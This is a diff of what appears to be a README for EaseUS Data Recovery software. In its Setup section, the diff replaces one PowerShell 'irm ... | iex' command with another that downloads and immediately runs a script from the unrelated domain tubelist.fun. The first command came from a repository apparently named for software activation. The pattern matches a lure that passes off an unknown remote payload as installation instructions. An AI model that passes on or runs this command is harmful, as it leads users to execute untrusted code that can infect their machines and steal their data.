@@ -7,7 +7,7 @@ EaseUS Data Recovery scans storage devices to locate and restore files that have
 ### Setup
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ### Supported Scenarios
